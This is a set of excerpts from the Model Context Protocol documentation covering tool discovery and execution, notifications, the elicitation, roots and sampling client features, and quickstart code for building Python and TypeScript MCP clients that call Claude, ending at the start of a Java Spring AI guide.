functionalities.\n\nEach tool object in the response includes several key fields:\n\n- **`name`**: A unique identifier for the tool within the server's namespace. This serves as the primary key for tool execution and should follow a clear naming pattern (e.g., `calculator_arithmetic` rather than just `calculate`)\n- **`title`**: A human-readable display name for the tool that clients can show to users\n- **`description`**: Detailed explanation of what the tool does and when to use it\n- **`inputSchema`**: A JSON Schema that defines the expected input parameters, enabling type validation and providing clear documentation about required and optional parameters\n\n#### How This Works in AI Applications\n\nThe AI application fetches available tools from all connected MCP servers and combines them into a unified tool registry that the language model can access. This allows the LLM to understand what actions it can perform and automatically generates the appropriate tool calls during conversations.\n\n```python Pseudo-code for AI application tool discovery\n# Pseudo-code using MCP Python SDK patterns\navailable_tools = []\nfor session in app.mcp_server_sessions():\n    tools_response = await session.list_tools()\n    available_tools.extend(tools_response.tools)\nconversation.register_available_tools(available_tools)\n```\n\n</Step>\n\n<Step title=\"Tool Execution (Primitives)\">\nThe client can now execute a tool using the `tools/call` method. This demonstrates how MCP primitives are used in practice: after discovering available tools, the client can invoke them with appropriate arguments.\n\n#### Understanding the Tool Execution Request\n\nThe `tools/call` request follows a structured format that ensures type safety and clear communication between client and server. Note that we're using the proper tool name from the discovery response (`weather_current`) rather than a simplified name:\n\n<CodeGroup>\n  ```json Tool Call Request\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 3,\n    \"method\": \"tools/call\",\n    \"params\": {\n      \"name\": \"weather_current\",\n      \"arguments\": {\n        \"location\": \"San Francisco\",\n        \"units\": \"imperial\"\n      }\n    }\n  }\n  ```\n  ```json Tool Call Response\n  {\n    \"jsonrpc\": \"2.0\",\n    \"id\": 3,\n    \"result\": {\n      \"content\": [\n        {\n          \"type\": \"text\",\n          \"text\": \"Current weather in San Francisco: 68°F, partly cloudy with light winds from the west at 8 mph. Humidity: 65%\"\n        }\n      ]\n    }\n  }\n  ```\n</CodeGroup>\n\n#### Key Elements of Tool Execution\n\nThe request structure includes several important components:\n\n1. **`name`**: Must match exactly the tool name from the discovery response (`weather_current`). This ensures the server can correctly identify which tool to execute.\n\n2. **`arguments`**: Contains the input parameters as defined by the tool's `inputSchema`. In this example:\n   - `location`: \"San Francisco\" (required parameter)\n   - `units`: \"imperial\" (optional parameter, defaults to \"metric\" if not specified)\n\n3. **JSON-RPC Structure**: Uses standard JSON-RPC 2.0 format with unique `id` for request-response correlation.\n\n#### Understanding the Tool Execution Response\n\nThe response demonstrates MCP's flexible content system:\n\n1. **`content` Array**: Tool responses return an array of content objects, allowing for rich, multi-format responses (text, images, resources, etc.)\n\n2. **Content Types**: Each content object has a `type` field. In this example, `\"type\": \"text\"` indicates plain text content, but MCP supports various content types for different use cases.\n\n3. **Structured Output**: The response provides actionable information that the AI application can use as context for language model interactions.\n\nThis execution pattern allows AI applications to dynamically invoke server functionality and receive structured responses that can be integrated into conversations with language models.\n\n#### How This Works in AI Applications\n\nWhen the language model decides to use a tool during a conversation, the AI application intercepts the tool call, routes it to the appropriate MCP server, executes it, and returns the results back to the LLM as part of the conversation flow. This enables the LLM to access real-time data and perform actions in the external world.\n\n```python\n# Pseudo-code for AI application tool execution\nasync def handle_tool_call(conversation, tool_name, arguments):\n    session = app.find_mcp_session_for_tool(tool_name)\n    result = await session.call_tool(tool_name, arguments)\n    conversation.add_tool_result(result.content)\n```\n\n</Step>\n\n<Step title=\"Real-time Updates (Notifications)\">\nMCP supports real-time notifications that enable servers to inform clients about changes without being explicitly requested. This demonstrates the notification system, a key feature that keeps MCP connections synchronized and responsive.\n\n#### Understanding Tool List Change Notifications\n\nWhen the server's available tools change—such as when new functionality becomes available, existing tools are modified, or tools become temporarily unavailable—the server can proactively notify connected clients:\n\n```json Request\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/tools/list_changed\"\n}\n```\n\n#### Key Features of MCP Notifications\n\n1. **No Response Required**: Notice there's no `id` field in the notification. This follows JSON-RPC 2.0 notification semantics where no response is expected or sent.\n\n2. **Capability-Based**: This notification is only sent by servers that declared `\"listChanged\": true` in their tools capability during initialization (as shown in Step 1).\n\n3. **Event-Driven**: The server decides when to send notifications based on internal state changes, making MCP connections dynamic and responsive.\n\n#### Client Response to Notifications\n\nUpon receiving this notification, the client typically reacts by requesting the updated tool list. This creates a refresh cycle that keeps the client's understanding of available tools current:\n\n```json Request\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 4,\n  \"method\": \"tools/list\"\n}\n```\n\n#### Why Notifications Matter\n\nThis notification system is crucial for several reasons:\n\n1. **Dynamic Environments**: Tools may come and go based on server state, external dependencies, or user permissions\n2. **Efficiency**: Clients don't need to poll for changes; they're notified when updates occur\n3. **Consistency**: Ensures clients always have accurate information about available server capabilities\n4. **Real-time Collaboration**: Enables responsive AI applications that can adapt to changing contexts\n\nThis notification pattern extends beyond tools to other MCP primitives, enabling comprehensive real-time synchronization between clients and servers.\n\n#### How This Works in AI Applications\n\nWhen the AI application receives a notification about changed tools, it immediately refreshes its tool registry and updates the LLM's available capabilities. This ensures that ongoing conversations always have access to the most current set of tools, and the LLM can dynamically adapt to new functionality as it becomes available.\n\n```python\n# Pseudo-code for AI application notification handling\nasync def handle_tools_changed_notification(session):\n    tools_response = await session.list_tools()\n    app.update_available_tools(session, tools_response.tools)\n    if app.conversation.is_active():\n        app.conversation.notify_llm_of_new_capabilities()\n```\n\n</Step>\n</Steps>\n"}

The host application, like Claude.ai or an IDE, manages the overall user experience and coordinates multiple clients. Each client handles one direct communication with one server.\n\nUnderstanding the distinction is important: the _host_ is the application users interact with, while _clients_ are the protocol-level components that enable server connections.\n\n## Core Client Features\n\nIn addition to making use of context provided by servers, clients may provide several features to servers.

Instead of requiring all information up front or failing when data is missing, servers can pause their operations to request specific inputs from users. This creates more flexible interactions where servers adapt to user needs rather than following rigid patterns.\n\n**Elicitation flow:**\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server,Client: Server initiates elicitation\n    Server->>Client: elicitation/create\n\n    Note over Client,User: Human interaction\n    Client->>User: Present elicitation UI\n    User-->>Client: Provide requested information\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return user response\n\n    Note over Server: Continue processing with new information\n```\n\nThe flow enables dynamic information gathering. Servers can request specific data when needed, users provide information through appropriate UI, and servers continue processing with the newly acquired context.\n\n**Elicitation components example:**\n\n```typescript\n{\n  method: \"elicitation/requestInput\",\n  params: {\n    message: \"Please confirm your Barcelona vacation booking details:\",\n    schema: {\n      type: \"object\",\n      properties: {\n        confirmBooking: {\n          type: \"boolean\",\n          description: \"Confirm the booking (Flights + Hotel = $3,000)\"\n        },\n        seatPreference: {\n          type: \"string\",\n          enum: [\"window\", \"aisle\", \"no preference\"],\n          description: \"Preferred seat type for flights\"\n        },\n        roomType: {\n          type: \"string\",\n          enum: [\"sea view\", \"city view\", \"garden view\"],\n          description: \"Preferred room type at hotel\"\n        },\n        travelInsurance: {\n          type: \"boolean\",\n          default: false,\n          description: \"Add travel insurance ($150)\"\n        }\n      },\n      required: [\"confirmBooking\"]\n    }\n  }\n}\n```\n\n#### Example: Holiday Booking Approval\n\nA travel booking server demonstrates elicitation's power through the final booking confirmation process. When a user has selected their ideal vacation package to Barcelona, the server needs to gather final approval and any missing details before proceeding.\n\nThe server elicits booking confirmation with a structured request that includes the trip summary (Barcelona flights June 15-22, beachfront hotel, total $3,000) and fields for any additional preferences—such as seat selection, room type, or travel insurance options.\n\nAs the booking progresses, the server elicits contact information needed to complete the reservation. It might ask for traveler details for flight bookings, special requests for the hotel, or emergency contact information.\n\n#### User Interaction Model\n\nElicitation interactions are designed to be clear, contextual, and respectful of user autonomy:\n\n**Request presentation**: Clients display elicitation requests with clear context about which server is asking, why the information is needed, and how it will be used. The request message explains the purpose while the schema provides structure and validation.\n\n**Response options**: Users can provide the requested information through appropriate UI controls (text fields, dropdowns, checkboxes), decline to provide information with optional explanation, or cancel the entire operation. Clients validate responses against the provided schema before returning them to servers.\n\n**Privacy considerations**: Elicitation never requests passwords or API keys. Clients warn about suspicious requests and let users review data before sending.\n\n### Roots\n\nRoots define filesystem boundaries for server operations, allowing clients to specify which directories servers should focus on.\n\n#### Overview\n\nRoots are a mechanism for clients to communicate filesystem access boundaries to servers. They consist of file URIs that indicate directories where servers can operate, helping servers understand the scope of available files and folders. While roots communicate intended boundaries, they do not enforce security restrictions. Actual security must be enforced at the operating system level, via file permissions and/or sandboxing.\n\n**Root structure:**\n\n```json\n{\n  \"uri\": \"file:///Users/agent/travel-planning\",\n  \"name\": \"Travel Planning Workspace\"\n}\n```\n\nRoots are exclusively filesystem paths and always use the `file://` URI scheme. They help servers understand project boundaries, workspace organization, and accessible directories. The roots list can be updated dynamically as users work with different projects or folders, with servers receiving notifications through `roots/list_changed` when boundaries change.\n\n#### Example: Travel Planning Workspace\n\nA travel agent working with multiple client trips benefits from roots to organize filesystem access. Consider a workspace with different directories for various aspects of travel planning.\n\nThe client provides filesystem roots to the travel planning server:\n\n- `file:///Users/agent/travel-planning` - Main workspace containing all travel files\n- `file:///Users/agent/travel-templates` - Reusable itinerary templates and resources\n- `file:///Users/agent/client-documents` - Client passports and travel documents\n\nWhen the agent creates a Barcelona itinerary, well-behaved servers respect these boundaries—accessing templates, saving the new itinerary, and referencing client documents within the specified roots. Servers typically access files within roots by using relative paths from the root directories or by utilizing file search tools that respect the root boundaries.\n\nIf the agent opens an archive folder like `file:///Users/agent/archive/2023-trips`, the client updates the roots list via `roots/list_changed`.\n\nFor a complete implementation of a server that respects roots, see the [filesystem server](https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem) in the official servers repository.\n\n#### Design Philosophy\n\nRoots serve as a coordination mechanism between clients and servers, not a security boundary. The specification requires that servers \"SHOULD respect root boundaries,\" and not that they \"MUST enforce\" them, because servers run code the client cannot control.\n\nRoots work best when servers are trusted or vetted, users understand their advisory nature, and the goal is preventing accidents rather than stopping malicious behavior. They excel at context scoping (telling servers where to focus), accident prevention (helping well-behaved servers stay in bounds), and workflow organization (such as managing project boundaries automatically).\n\n#### User Interaction Model\n\nRoots are typically managed automatically by host applications based on user actions, though some applications may expose manual root management:\n\n**Automatic root detection**: When users open folders, clients automatically expose them as roots. Opening a travel workspace allows the client to expose that directory as a root, helping servers understand which itineraries and documents are in scope for the current work.\n\n**Manual root configuration**: Advanced users can specify roots through configuration. For example, adding `/travel-templates` for reusable resources while excluding directories with financial records.\n\n### Sampling\n\nSampling allows servers to request language model completions through the client, enabling agentic behaviors while maintaining security and user control.\n\n#### Overview\n\nSampling enables servers to perform AI-dependent tasks without directly integrating with or paying for AI models. Instead, servers can request that the client—which already has AI model access—handle these tasks on their behalf. This approach puts the client in complete control of user permissions and security measures. Because sampling requests occur within the context of other operations—like a tool analyzing data—and are processed as separate model calls, they maintain clear boundaries between different contexts, allowing for more efficient use of the context window.\n\n**Sampling flow:**\n\n```mermaid\nsequenceDiagram\n    participant LLM\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server,Client: Server initiates sampling\n    Server->>Client: sampling/createMessage\n\n    Note over Client,User: Human-in-the-loop review\n    Client->>User: Present request for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Client,LLM: Model interaction\n    Client->>LLM: Forward approved request\n    LLM-->>Client: Return generation\n\n    Note over Client,User: Response review\n    Client->>User: Present response for approval\n    User-->>Client: Review and approve/modify\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return approved response\n```\n\nThe flow ensures security through multiple human-in-the-loop checkpoints. Users review and can modify both the initial request and the generated response before it returns to the server.\n\n**Request parameters example:**\n\n```typescript\n{\n  messages: [\n    {\n      role: \"user\",\n      content: \"Analyze these flight options and recommend the best choice:\\n\" +\n               \"[47 flights with prices, times, airlines, and layovers]\\n\" +\n               \"User preferences: morning departure, max 1 layover\"\n    }\n  ],\n  modelPreferences: {\n    hints: [{\n      name: \"claude-sonnet-4-20250514\"  // Suggested model\n    }],\n    costPriority: 0.3,      // Less concerned about API cost\n    speedPriority: 0.2,     // Can wait for thorough analysis\n    intelligencePriority: 0.9  // Need complex trade-off evaluation\n  },\n  systemPrompt: \"You are a travel expert helping users find the best flights based on their preferences\",\n  maxTokens: 1500\n}\n```\n\n#### Example: Flight Analysis Tool\n\nConsider a travel booking server with a tool called `findBestFlight` that uses sampling to analyze available flights and recommend the optimal choice. When a user asks \"Book me the best flight to Barcelona next month,\" the tool needs AI assistance to evaluate complex trade-offs.\n\nThe tool queries airline APIs and gathers 47 flight options. It then requests AI assistance to analyze these options: \"Analyze these flight options and recommend the best choice: [47 flights with prices, times, airlines, and layovers] User preferences: morning departure, max 1 layover.\"\n\nThe client initiates the sampling request, allowing the AI to evaluate trade-offs—like cheaper red-eye flights versus convenient morning departures. The tool uses this analysis to present the top three recommendations.\n\n#### User Interaction Model\n\nWhile not a requirement, sampling is designed to allow human-in-the-loop control. Users can maintain oversight through several mechanisms:\n\n**Approval controls**: Sampling requests may require explicit user consent. Clients can show what the server wants to analyze and why. Users can approve, deny, or modify requests.\n\n**Transparency features**: Clients can display the exact prompt, model selection, and token limits, allowing users to review AI responses before they return to the server.\n\n**Configuration options**: Users can set model preferences, configure auto-approval for trusted operations, or require approval for everything. Clients may provide options to redact sensitive information.\n\n**Security considerations**: Both clients and servers must handle sensitive data appropriately during sampling. Clients should implement rate limiting and validate all message content. The human-in-the-loop design ensures that server-initiated AI interactions cannot compromise security or access sensitive data without explicit user consent.\n"}

methods will go here\n```\n\n### Server Connection Management\n\nNext, we'll implement the method to connect to an MCP server:\n\n```python\nasync def connect_to_server(self, server_script_path: str):\n    \"\"\"Connect to an MCP server\n\n    Args:\n        server_script_path: Path to the server script (.py or .js)\n    \"\"\"\n    is_python = server_script_path.endswith('.py')\n    is_js = server_script_path.endswith('.js')\n    if not (is_python or is_js):\n        raise ValueError(\"Server script must be a .py or .js file\")\n\n    command = \"python\" if is_python else \"node\"\n    server_params = StdioServerParameters(\n        command=command,\n        args=[server_script_path],\n        env=None\n    )\n\n    stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))\n    self.stdio, self.write = stdio_transport\n    self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))\n\n    await self.session.initialize()\n\n    #

Initial Claude API call\n    response = self.anthropic.messages.create(\n        model=\"claude-sonnet-4-20250514\",\n        max_tokens=1000,\n        messages=messages,\n        tools=available_tools\n    )\n\n    # Process response and handle tool calls\n    final_text = []\n\n    assistant_message_content = []\n    for content in response.content:\n        if content.type == 'text':\n            final_text.append(content.text)\n            assistant_message_content.append(content)\n        elif content.type == 'tool_use':\n            tool_name = content.name\n            tool_args = content.input\n\n            # Execute tool call\n            result = await self.session.call_tool(tool_name, tool_args)\n            final_text.append(f\"[Calling tool {tool_name} with args {tool_args}]\")\n\n            assistant_message_content.append(content)\n            messages.append({\n                \"role\": \"assistant\",\n                \"content\": assistant_message_content\n            })\n            messages.append({\n                \"role\": \"user\",\n                \"content\": [\n                    {\n                        \"type\": \"tool_result\",\n                        \"tool_use_id\": content.id,\n                        \"content\": result.content\n                    }\n                ]\n            })\n\n            # Get next response from Claude\n            response = self.anthropic.messages.create(\n                model=\"claude-sonnet-4-20250514\",\n                max_tokens=1000,\n                messages=messages,\n                tools=available_tools\n            )\n\n            final_text.append(response.content[0].text)\n\n    return \"\\n\".join(final_text)\n```\n\n### Interactive Chat Interface\n\nNow we'll add the chat loop and cleanup functionality:\n\n```python\nasync def chat_loop(self):\n    \"\"\"Run an interactive chat loop\"\"\"\n    print(\"\\nMCP Client Started!\")\n    print(\"Type your queries or 'quit' to exit.\")\n\n    while True:\n        try:\n            query = input(\"\\nQuery: \").strip()\n\n            if query.lower() == 'quit':\n                break\n\n            response = await self.process_query(query)\n            print(\"\\n\" + response)\n\n        except Exception as e:\n            print(f\"\\nError: {str(e)}\")\n\nasync def cleanup(self):\n    \"\"\"Clean up resources\"\"\"\n    await self.exit_stack.aclose()\n```\n\n### Main Entry Point\n\nFinally, we'll add the main execution logic:\n\n```python\nasync def main():\n    if len(sys.argv) < 2:\n        print(\"Usage: python client.py <path_to_server_script>\")\n        sys.exit(1)\n\n    client = MCPClient()\n    try:\n        await client.connect_to_server(sys.argv[1])\n        await client.chat_loop()\n    finally:\n        await client.cleanup()\n\nif __name__ == \"__main__\":\n    import sys\n    asyncio.run(main())\n```\n\nYou can find the complete `client.py` file [here](https://github.com/modelcontextprotocol/quickstart-resources/blob/main/mcp-client-python/client.py).\n\n## Key Components Explained\n\n### 1. Client Initialization\n\n- The `MCPClient` class initializes with session management and API clients\n- Uses `AsyncExitStack` for proper resource management\n- Configures the Anthropic client for Claude interactions\n\n### 2. Server Connection\n\n- Supports both Python and Node.js servers\n- Validates server script type\n- Sets up proper communication channels\n- Initializes the session and lists available tools\n\n### 3. Query Processing\n\n- Maintains conversation context\n- Handles Claude's responses and tool calls\n- Manages the message flow between Claude and tools\n- Combines results into a coherent response\n\n### 4. Interactive Interface\n\n- Provides a simple command-line interface\n- Handles user input and displays responses\n- Includes basic error handling\n- Allows graceful exit\n\n### 5. Resource Management\n\n- Proper cleanup of resources\n- Error handling for connection issues\n- Graceful shutdown procedures\n\n## Common Customization Points\n\n1. **Tool Handling**\n   - Modify `process_query()` to handle specific tool types\n   - Add custom error handling for tool calls\n   - Implement tool-specific response formatting\n\n2. **Response Processing**\n   - Customize how tool results are formatted\n   - Add response filtering or transformation\n   - Implement custom logging\n\n3. **User Interface**\n   - Add a GUI or web interface\n   - Implement rich console output\n   - Add command history or auto-completion\n\n## Running the Client\n\nTo run your client with any MCP server:\n\n```bash\nuv run client.py path/to/server.py # python server\nuv run client.py path/to/build/index.js # node server\n```\n\n<Note>\n\nIf you're continuing [the weather tutorial from the server quickstart](https://github.com/modelcontextprotocol/quickstart-resources/tree/main/weather-server-python), your command might look something like this: `python client.py .../quickstart-resources/weather-server-python/weather.py`\n\n</Note>\n\nThe client will:\n\n1. Connect to the specified server\n2. List available tools\n3. Start an interactive chat session where you can:\n   - Enter queries\n   - See tool executions\n   - Get responses from Claude\n\nHere's an example of what it should look like if connected to the weather server from the server quickstart:\n\n<Frame>\n  <img src=\"/images/client-claude-cli-python.png\" />\n</Frame>\n\n## How It Works\n\nWhen you submit a query:\n\n1. The client gets the list of available tools from the server\n2. Your query is sent to Claude along with tool descriptions\n3. Claude decides which tools (if any) to use\n4. The client executes any requested tool calls through the server\n5. Results are sent back to Claude\n6. Claude provides a natural language response\n7. The response is displayed to you\n\n## Best practices\n\n1. **Error Handling**\n   - Always wrap tool calls in try-catch blocks\n   - Provide meaningful error messages\n   - Gracefully handle connection issues\n\n2. **Resource Management**\n   - Use `AsyncExitStack` for proper cleanup\n   - Close connections when done\n   - Handle server disconnections\n\n3. **Security**\n   - Store API keys securely in `.env`\n   - Validate server responses\n   - Be cautious with tool permissions\n\n4. **Tool Names**\n   - Tool names can be validated according to the format specified [here](/specification/draft/server/tools#tool-names)\n   - If a tool name conforms to the specified format, it should not fail validation by an MCP client\n\n## Troubleshooting\n\n### Server Path Issues\n\n- Double-check the path to your server script is correct\n- Use the absolute path if the relative path isn't working\n- For Windows users, make sure to use forward slashes (/) or escaped backslashes (\\\\) in the path\n- Verify the server file has the correct extension (.py for Python or .js for Node.js)\n\nExample of correct path usage:\n\n```bash\n# Relative path\nuv run client.py ./server/weather.py\n\n# Absolute path\nuv run client.py /Users/username/projects/mcp-server/weather.py\n\n# Windows path (either format works)\nuv run client.py C:/projects/mcp-server/weather.py\nuv run client.py C:\\\\projects\\\\mcp-server\\\\weather.py\n```\n\n### Response Timing\n\n- The first response might take up to 30 seconds to return\n- This is normal and happens while:\n  - The server initializes\n  - Claude processes the query\n  - Tools are being executed\n- Subsequent responses are typically faster\n- Don't interrupt the process during this initial waiting period\n\n### Common Error Messages\n\nIf you see:\n\n- `FileNotFoundError`: Check your server path\n- `Connection refused`: Ensure the server is running and the path is correct\n- `Tool execution failed`: Verify the tool's required environment variables are set\n- `Timeout error`: Consider increasing the timeout in your client configuration\n\n</Tab>\n\n<Tab title=\"TypeScript\">\n\n[You can find the complete

index.ts\n```\n\n```powershell Windows\n# Create project directory\nmd mcp-client-typescript\ncd mcp-client-typescript\n\n# Initialize npm project\nnpm init -y\n\n# Install dependencies\nnpm install @anthropic-ai/sdk @modelcontextprotocol/sdk dotenv\n\n# Install dev dependencies\nnpm install -D @types/node typescript\n\n# Create source file\nnew-item index.ts\n```\n\n</CodeGroup>\n\nUpdate your `package.json` to set `type: \"module\"` and a build script:\n\n```json package.json\n{\n  \"type\": \"module\",\n  \"scripts\": {\n    \"build\": \"tsc && chmod 755 build/index.js\"\n  }\n}\n```\n\nCreate a `tsconfig.json` in the root of your project:\n\n```json tsconfig.json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"Node16\",\n    \"moduleResolution\": \"Node16\",\n    \"outDir\": \"./build\",\n    \"rootDir\": \"./\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true\n  },\n  \"include\": [\"index.ts\"],\n  \"exclude\": [\"node_modules\"]\n}\n```\n\n## Setting Up Your API Key\n\nYou'll need an Anthropic API key from the [Anthropic Console](https://console.anthropic.com/settings/keys).\n\nCreate a `.env` file to store it:\n\n```bash\necho \"ANTHROPIC_API_KEY=<your key here>\" > .env\n```\n\nAdd `.env` to your `.gitignore`:\n\n```bash\necho \".env\" >> .gitignore\n```\n\n<Warning>\n\nMake sure you keep your `ANTHROPIC_API_KEY` secure!\n\n</Warning>\n\n## Creating the Client\n\n### Basic Client Structure\n\nFirst, let's set up our imports and create the basic client class in `index.ts`:\n\n```typescript\nimport { Anthropic } from \"@anthropic-ai/sdk\";\nimport {\n  MessageParam,\n  Tool,\n} from \"@anthropic-ai/sdk/resources/messages/messages.mjs\";\nimport { Client } from \"@modelcontextprotocol/sdk/client/index.js\";\nimport { StdioClientTransport } from \"@modelcontextprotocol/sdk/client/stdio.js\";\nimport readline from \"readline/promises\";\nimport dotenv from \"dotenv\";\n\ndotenv.config();\n\nconst ANTHROPIC_API_KEY = process.env.ANTHROPIC_API_KEY;\nif (!ANTHROPIC_API_KEY) {\n  throw new Error(\"ANTHROPIC_API_KEY is not set\");\n}\n\nclass MCPClient {\n  private mcp: Client;\n  private anthropic: Anthropic;\n  private transport: StdioClientTransport | null = null;\n  private tools: Tool[] = [];\n\n  constructor() {\n    this.anthropic = new Anthropic({\n      apiKey: ANTHROPIC_API_KEY,\n    });\n    this.mcp = new Client({ name: \"mcp-client-cli\", version: \"1.0.0\" });\n  }\n  // methods will go here\n}\n```\n\n### Server Connection Management\n\nNext, we'll implement the method to connect to an MCP server:\n\n```typescript\nasync connectToServer(serverScriptPath: string) {\n  try {\n    const isJs = serverScriptPath.endsWith(\".js\");\n    const isPy = serverScriptPath.endsWith(\".py\");\n    if (!isJs && !isPy) {\n      throw new Error(\"Server script must be a .js or .py file\");\n    }\n    const command = isPy\n      ? process.platform === \"win32\"\n        ? \"python\"\n        : \"python3\"\n      : process.execPath;\n\n    this.transport = new StdioClientTransport({\n      command,\n      args: [serverScriptPath],\n    });\n    await this.mcp.connect(this.transport);\n\n    const toolsResult = await this.mcp.listTools();\n    this.tools = toolsResult.tools.map((tool) => {\n      return {\n        name: tool.name,\n        description: tool.description,\n        input_schema: tool.inputSchema,\n      };\n    });\n    console.log(\n      \"Connected to server with tools:\",\n      this.tools.map(({ name }) => name)\n    );\n  } catch (e) {\n    console.log(\"Failed to connect to MCP server: \", e);\n    throw e;\n  }\n}\n```\n\n### Query Processing Logic\n\nNow let's add the core functionality for processing queries and handling tool calls:\n\n```typescript\nasync processQuery(query: string) {\n  const messages: MessageParam[] = [\n    {\n      role: \"user\",\n      content: query,\n    },\n  ];\n\n  const response = await this.anthropic.messages.create({\n    model: \"claude-sonnet-4-20250514\",\n    max_tokens: 1000,\n    messages,\n    tools: this.tools,\n  });\n\n  const finalText = [];\n\n  for (const content of response.content) {\n    if (content.type === \"text\") {\n      finalText.push(content.text);\n    } else if (content.type === \"tool_use\") {\n      const toolName = content.name;\n      const toolArgs = content.input as { [x: string]: unknown } | undefined;\n\n      const result = await this.mcp.callTool({\n        name: toolName,\n        arguments: toolArgs,\n      });\n      finalText.push(\n        `[Calling tool ${toolName} with args ${JSON.stringify(toolArgs)}]`\n      );\n\n      messages.push({\n        role: \"user\",\n        content: result.content as string,\n      });\n\n      const response = await this.anthropic.messages.create({\n        model: \"claude-sonnet-4-20250514\",\n        max_tokens: 1000,\n        messages,\n      });\n\n      finalText.push(\n        response.content[0].type === \"text\" ? response.content[0].text : \"\"\n      );\n    }\n  }\n\n  return finalText.join(\"\\n\");\n}\n```\n\n### Interactive Chat Interface\n\nNow we'll add the chat loop and cleanup functionality:\n\n```typescript\nasync chatLoop() {\n  const rl = readline.createInterface({\n    input: process.stdin,\n    output: process.stdout,\n  });\n\n  try {\n    console.log(\"\\nMCP Client Started!\");\n    console.log(\"Type your queries or 'quit' to exit.\");\n\n    while (true) {\n      const message = await rl.question(\"\\nQuery: \");\n      if (message.toLowerCase() === \"quit\") {\n        break;\n      }\n      const response = await this.processQuery(message);\n      console.log(\"\\n\" + response);\n    }\n  } finally {\n    rl.close();\n  }\n}\n\nasync cleanup() {\n  await this.mcp.close();\n}\n```\n\n### Main Entry Point\n\nFinally, we'll add the main execution logic:\n\n```typescript\nasync function main() {\n  if (process.argv.length < 3) {\n    console.log(\"Usage: node index.ts <path_to_server_script>\");\n    return;\n  }\n  const mcpClient = new MCPClient();\n  try {\n    await mcpClient.connectToServer(process.argv[2]);\n    await mcpClient.chatLoop();\n  } catch (e) {\n    console.error(\"Error:\", e);\n    await mcpClient.cleanup();\n    process.exit(1);\n  } finally {\n    await mcpClient.cleanup();\n    process.exit(0);\n  }\n}\n\nmain();\n```\n\n## Running the Client\n\nTo run your client with any MCP server:\n\n```bash\n# Build TypeScript\nnpm run build\n\n# Run the client\nnode build/index.js path/to/server.py # python server\nnode build/index.js path/to/build/index.js # node server\n```\n\n<Note>\n\nIf you're continuing [the weather tutorial from the server quickstart](https://github.com/modelcontextprotocol/quickstart-resources/tree/main/weather-server-typescript), your command might look something like this: `node build/index.js .../quickstart-resources/weather-server-typescript/build/index.js`\n\n</Note>\n\n**The client will:**\n\n1. Connect to the specified server\n2. List available tools\n3. Start an interactive chat session where you can:\n   - Enter queries\n   - See tool executions\n   - Get responses from Claude\n\n## How It Works\n\nWhen you submit a query:\n\n1. The client gets the list of available tools from the server\n2. Your query is sent to Claude along with tool descriptions\n3. Claude decides which tools (if any) to use\n4. The client executes any requested tool calls through the server\n5. Results are sent back to Claude\n6. Claude provides a natural language response\n7. The response is displayed to you\n\n## Best practices\n\n1. **Error Handling**\n   - Use TypeScript's type system for better error detection\n   - Wrap tool calls in try-catch blocks\n   - Provide meaningful error messages\n   - Gracefully handle connection issues\n\n2. **Security**\n   - Store API keys securely in `.env`\n   - Validate server responses\n   - Be cautious with tool permissions\n\n## Troubleshooting\n\n### Server Path Issues\n\n- Double-check the path to your server script is correct\n- Use the absolute path if the relative path isn't working\n- For Windows users, make sure to use forward slashes (/) or escaped backslashes (\\\\) in the path\n- Verify the server file has the correct extension (.js for Node.js or .py for Python)\n\nExample of correct path usage:\n\n```bash\n# Relative path\nnode build/index.js ./server/build/index.js\n\n# Absolute path\nnode build/index.js /Users/username/projects/mcp-server/build/index.js\n\n# Windows path (either format works)\nnode build/index.js C:/projects/mcp-server/build/index.js\nnode build/index.js C:\\\\projects\\\\mcp-server\\\\build\\\\index.js\n```\n\n### Response Timing\n\n- The first response might take up to 30 seconds to return\n- This is normal and happens while:\n  - The server initializes\n  - Claude processes the query\n  - Tools are being executed\n- Subsequent responses are typically faster\n- Don't interrupt the process during this initial waiting period\n\n### Common Error Messages\n\nIf you see:\n\n- `Error: Cannot find module`: Check your build folder and ensure TypeScript compilation succeeded\n- `Connection refused`: Ensure the server is running and the path is correct\n- `Tool execution failed`: Verify the tool's required environment variables are set\n- `ANTHROPIC_API_KEY is not set`: Check your .env file and environment variables\n- `TypeError`: Ensure you're using the correct types for tool arguments\n- `BadRequestError`: Ensure you have enough credits to access the Anthropic API\n\n</Tab>\n\n<Tab title=\"Java\">\n\n<Note>\n\nThis is a quickstart demo based on Spring AI MCP auto-configuration and boot starters.\nTo learn how to create sync and async MCP Clients manually, consult the [Java SDK Client](/sdk/java/mcp-client) documentation\n\n</Note>\n\nThis example demonstrates how to build an interactive chatbot that combines Spring AI's Model Context Protocol (MCP) with the [Brave Search MCP Server](https://github.com/modelcontextprotocol/servers-archived/tree/main/src/brave-search). The application creates a conversational interface powered by Anthropic's Claude AI model that can perform internet searches through Brave Search, enabling natural language interactions with real-time web data.\n[You can find the complete code for this tutorial here.](https://github.com/spring-projects/spring-ai-examples/tree/main/model-context-protocol/web-search/brave-chatbot)\n\n## System Requirements\n\nBefore starting, ensure your system meets these requirements:\n\n- Java 17 or higher\n- Maven 3.6+\n- npx package manager\n- Anthropic API key (Claude)\n- Brave Search API key\n\n## Setting Up Your Environment\n\n1. Install npx (Node Package eXecute):\n   First, make sure to install [npm](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm)\n   and then run:\n\n   ```bash\n   npm install -g npx\n   ```\n\n2. Clone the repository:\n\n   ```bash\n   git clone https://github.com/spring-projects/spring-ai-examples.git\n   cd model-context-protocol/web-search/brave-chatbot\n   ```\n\n3. Set up your API keys:\n\n   ```bash\n   export ANTHROPIC_API_KEY='your-anthropic-api-key-here'\n   export BRAVE_API_KEY='your-brave-api-key-here'\n   ```\n\n4. Build the application:\n\n   ```bash\n   ./mvnw clean install\n   ```\n\n5. Run the application using Maven:\n   ```bash\n   ./mvnw 